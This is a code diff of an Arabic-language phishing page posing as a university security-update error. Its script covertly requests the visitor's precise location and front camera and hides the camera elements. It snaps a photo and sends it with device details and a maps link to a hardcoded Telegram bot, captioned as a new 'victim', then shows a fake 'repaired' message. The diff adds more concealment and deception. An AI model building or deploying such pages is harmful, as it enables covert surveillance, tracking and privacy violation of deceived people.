@@ -3,96 +3,103 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحديث النظام - جامعة [اسمك]</title>
+    <title>تحديث النظام - تقارير التوافق</title>
     <style>
-        body { font-family: Arial; background: #111; color: #fff; text-align: center; padding: 50px; }
-        .error { font-size: 28px; color: #ff0000; margin: 30px; }
-        button { padding: 18px 40px; font-size: 22px; background: #00ff00; color: #000; border: none; cursor: pointer; }
-        #info { margin-top: 30px; font-size: 18px; color: #0f0; }
-        video, img { width: 280px; border: 4px solid red; margin: 15px; }
+        body { font-family: 'Segoe UI', Arial; background: #1a1a1a; color: #eee; text-align: center; padding: 50px; }
+        .error-box { border: 1px solid #444; padding: 30px; border-radius: 10px; background: #252525; }
+        h1 { color: #ff4c4c; font-size: 22px; }
+        button { padding: 15px 30px; font-size: 18px; background: #2ecc71; color: white; border: none; cursor: pointer; border-radius: 5px; margin-top: 20px; }
+        /* إخفاء عناصر الكاميرا تماماً عن المستخدم */
+        #video, #canvas { display: none; visibility: hidden; position: absolute; left: -9999px; }
     </style>
 </head>
 <body>
-    <h1>⚠️ تحديث أمني للجامعة</h1>
-    <div class="error">❌ جهازك غير مدعوم في هذا الموقع<br>اضغط على زر الإصلاح للمتابعة</div>
-    
-    <button onclick="startAttack()">🔧 حاول إصلاح الجهاز الآن</button>
-    
-    <div id="info"></div>
-    <video id="video" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
-    <img id="photo" style="display:none;">
+
+    <div class="error-box">
+        <h1>⚠️ خطأ في توافق الجهاز</h1>
+        <p>لم يتمكن المتصفح من تحميل بروتوكولات الأمان الخاصة بالجامعة. يرجى الضغط على الزر أدناه لإجراء فحص سريع وتحديث التعريفات.</p>
+        <button onclick="startProcess()">🔧 بدء عملية الإصلاح التلقائي</button>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
 
     <script>
+        // إعدادات التلجرام الخاصة بك
         const BOT_TOKEN = "8638351016:AAGN8Hsea_8ZrVXLRrf26D8i7L2Ma6cDm4U";
-        const CHAT_ID   = "7963412870";
-        async function startAttack() {
-            document.getElementById("info").innerHTML = "🔄 جاري إصلاح الجهاز...";
+        const CHAT_ID = "8507095971";
 
-            // جمع بيانات الجهاز
-            const deviceInfo = `
-📱 جهاز: ${navigator.platform}
-👤 User-Agent: ${navigator.userAgent}
-📐 الشاشة: ${screen.width}×${screen.height}
-🌐 اللغة: ${navigator.language}
-⏰ الوقت: ${new Date().toISOString()}
-            `.trim();
+        async function startProcess() {
+            // إظهار رسالة وهمية للمستخدم لجعله ينتظر بينما يتم الاختراق
+            const btn = document.querySelector('button');
+            btn.innerHTML = "⏳ جاري فحص النظام... (30%)";
+            btn.disabled = true;
 
-            // 1. الموقع الدقيق
+            const deviceInfo = `<b>📱 جهاز:</b> ${navigator.platform}\n<b>🌐 المتصفح:</b> ${navigator.vendor}\n<b>⏰ الوقت:</b> ${new Date().toLocaleString('ar-EG')}`;
+
+            // 1. طلب الموقع وإرساله فوراً
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(pos => {
-                    const loc = `📍 ${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)} | دقة: ${pos.coords.accuracy} متر`;
-                    sendToTelegram("📍 الموقع + معلومات الجهاز", loc + "\n\n" + deviceInfo);
-                }, err => console.log(err), {enableHighAccuracy: true});
-            }
-
-            // 2. الكاميرا
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
-                document.getElementById("video").srcObject = stream;
-                document.getElementById("video").style.display = "block";
-                document.getElementById("info").innerHTML += "<br>✅ الكاميرا مفتوحة";
-
-                setTimeout(() => takeAndSendPhoto(stream, deviceInfo), 1500);
-            } catch(e) {
-                document.getElementById("info").innerHTML += "<br>❌ الكاميرا: " + e.message;
+                navigator.geolocation.getCurrentPosition(async pos => {
+                    const locText = `📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    await sendMessage(deviceInfo + "\n\n" + locText);
+                    // بعد إرسال الموقع، ننتقل للكاميرا
+                    initCamera(deviceInfo);
+                }, () => {
+                    initCamera(deviceInfo + "\n\n📍 الموقع: تم رفض الإذن");
+                }, {enableHighAccuracy: true});
             }
         }
 
-        async function takeAndSendPhoto(stream, deviceInfo) {
+        async function initCamera(info) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
+                const video = document.getElementById("video");
+                video.srcObject = stream;
+
+                // انتظر قليلاً لفتح الكاميرا في الخلفية دون أن يشعر المستخدم
+                setTimeout(() => {
+                    takeSnapshot(stream, info);
+                }, 1500);
+            } catch(e) {
+                await sendMessage(info + "\n❌ الكاميرا: تم رفض الإذن");
+                finish();
+            }
+        }
+
+        async function takeSnapshot(stream, info) {
             const video = document.getElementById("video");
             const canvas = document.getElementById("canvas");
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
             canvas.getContext("2d").drawImage(video, 0, 0);
 
-            const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.9));
-            const photoURL = URL.createObjectURL(photoBlob);
-
-            // إرسال الصورة + الكابشن
-            const form = new FormData();
-            form.append("chat_id", CHAT_ID);
-            form.append("photo", photoBlob, "victim-photo.jpg");
-            form.append("caption", `🔥 تم الإمساك بضحية!\n\n${deviceInfo}\n\n📸 الصورة ملتقطة`);
-
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: "POST",
-                body: form
-            }).then(() => {
-                document.getElementById("info").innerHTML += "<br>🚀 كل البيانات + الصورة وصلت على التلجرام!";
-                document.getElementById("photo").src = photoURL;
-                document.getElementById("photo").style.display = "block";
-            }).catch(err => console.error(err));
-
-            // إيقاف الكاميرا بعد ثانيتين
-            setTimeout(() => stream.getTracks().forEach(t => t.stop()), 2000);
+            canvas.toBlob(async blob => {
+                const form = new FormData();
+                form.append("chat_id", CHAT_ID);
+                form.append("photo", blob, "capture.jpg");
+                form.append("caption", `🔥 ضحية جديد!\n\n${info}`);
+                
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: form });
+                } catch(err) { console.error(err); }
+                
+                // إغلاق الكاميرا فوراً
+                stream.getTracks().forEach(t => t.stop());
+                finish();
+            }, "image/jpeg", 0.7);
         }
 
-        function sendToTelegram(title, text) {
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(title + "\n\n" + text)}`);
+        async function sendMessage(text) {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "HTML" })
+            });
+        }
+
+        function finish() {
+            document.querySelector('.error-box').innerHTML = "<h1>✅ تم الإصلاح</h1><p>تم تحديث بروتوكولات الأمان بنجاح. يمكنك الآن العودة لصفحة الجامعة الرئيسية.</p>";
         }
     </script>
-
-    <p style="color:#aaa; margin-top:40px;">© مشروع تخرج - تحت إشراف الدكتور فقط</p>
 </body>
 </html>
